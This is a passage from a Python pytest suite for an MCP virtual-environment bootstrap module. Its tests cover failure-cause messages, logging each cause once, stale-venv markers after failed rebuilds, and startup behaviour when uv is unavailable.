        (d / "package.json").write_text("{}")
        assert mcp_venv_bootstrap.start_failure_cause(self._manifest(d, "node", "node")) \
            == "its node_modules/ is missing"

    def test_nothing_wrong(self, fake_mcps_root):
        d = _custom_py(fake_mcps_root)
        _write_pyvenv(d / "venv", sys.version_info[0], sys.version_info[1])
        assert mcp_venv_bootstrap.start_failure_cause(self._manifest(d, "python", "venv/bin/python")) \
            == "its command venv/bin/python is missing"
        (d / "venv" / "bin").mkdir()
        (d / "venv" / "bin" / "python").symlink_to("/usr/bin/env")
        assert mcp_venv_bootstrap.start_failure_cause(self._manifest(d, "python", "venv/bin/python")) == ""

    def test_each_cause_is_logged_once(self, fake_mcps_root, caplog, monkeypatch):
        monkeypatch.setattr(mcp_venv_bootstrap, "_causes_logged", set())
        d = _custom_py(fake_mcps_root)
        m = self._manifest(d, "python", "venv/bin/python")
        mcp_venv_bootstrap.log_start_failures([m, m])
        mcp_venv_bootstrap.log_start_failures([m])
        assert caplog.text.count("MCP py-mcp failed to start: its venv/ is missing") == 1


@pytest.mark.asyncio
async def test_the_cli_session_reports_why_a_failed_mcp_did_not_start(fake_mcps_root, caplog, monkeypatch):
    """The init frame names failed MCPs by their config key; the session maps
    them to manifests and logs the cause the folder shows."""
    from types import SimpleNamespace
    from core.layers.cli import session as cli_session
    from services.mcp import mcp_registry
    monkeypatch.setattr(mcp_venv_bootstrap, "_causes_logged", set())
    d = _custom_py(fake_mcps_root, "camo")
    m = SimpleNamespace(name="camo", mcp_dir=d,
                        server=SimpleNamespace(runtime="python", command="venv/bin/python"))
    monkeypatch.setattr(mcp_registry, "get_manifest_by_config_key",
                        lambda key: m if key == "playwright" else None)
    await cli_session.PersistentSession._log_mcp_start_failures(["playwright", "unknown"])
    assert "MCP camo failed to start: its venv/ is missing" in caplog.text


@pytest.mark.asyncio
async def test_a_failed_rebuild_leaves_no_venv_reading_fresh(fake_mcps_root, tmp_path):
    """The success mark goes before the venv: a rebuild whose install fails
    is stale at the next start, not an empty venv read as fresh."""
    mcp_dir = _custom_py(fake_mcps_root)
    _outside_venv(mcp_dir, tmp_path)
    mcp_venv_bootstrap._write_marker(
        mcp_dir, requirements_sha256=mcp_venv_bootstrap._requirements_hash(mcp_dir / "requirements.txt"),
        python=_SPEC)
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock,
               return_value=InstallResult(ok=False, log="network down")):
        assert await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup() == {"py-mcp": "failed"}
    marker = _marker(mcp_dir)
    assert "requirements_sha256" not in marker and "python" not in marker
    (mcp_dir / "venv").mkdir(exist_ok=True)   # what the failed install left behind
    assert mcp_venv_bootstrap._venv_is_stale(mcp_dir / "requirements.txt", mcp_dir / "venv", mcp_dir)


@pytest.mark.asyncio
async def test_without_uv_a_venv_reads_reconciled_and_is_not_rebuilt_daily(fake_mcps_root, monkeypatch):
    mcp_dir = _custom_py(fake_mcps_root)
    monkeypatch.setattr(mcp_venv_bootstrap, "find_uv", lambda: None)
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock,
               return_value=InstallResult(ok=True, log="ok", venv_python="")):
        assert await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup() == {"py-mcp": "ok"}
    marker = _marker(mcp_dir)
    assert marker["python"] == _SPEC and "python_pin_failed" not in marker
